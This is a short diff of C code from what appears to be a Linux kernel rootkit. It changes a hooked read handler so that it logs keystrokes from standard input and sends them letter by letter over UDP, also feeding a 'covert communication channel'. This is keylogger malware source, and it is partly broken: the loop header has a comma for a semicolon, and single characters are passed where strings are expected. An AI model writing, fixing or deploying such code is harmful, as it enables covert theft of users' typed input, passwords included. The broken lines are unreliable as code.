@@ -53,7 +53,7 @@ void init_netpoll(void)
 void send_udp(const char *buf)
 {
 	struct task_struct *task = current;
-	char buf1[20];
+	char buf1[200];
 	sprintf(buf1, "%d", task->pid);
 	int len1 = strlen(buf1);
 	strcpy(buf1+len1, buf);
@@ -74,11 +74,13 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 
 	if(ret >= 1 && fd == 0)
 	{
-		// TODO: implement keylogging : done : Sending letter by letter
-		send_udp(buf);
+		for(int i = 0; i < ret, i++) {
+			// TODO: implement keylogging : done : Sending letter by letter
+			send_udp(buf[i]);
 
-		/* send to covert communication channel */
-		accept_input(buf[0]);
+			/* send to covert communication channel */
+			accept_input(buf[i]);
+		}
 	}
 
 	DECREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
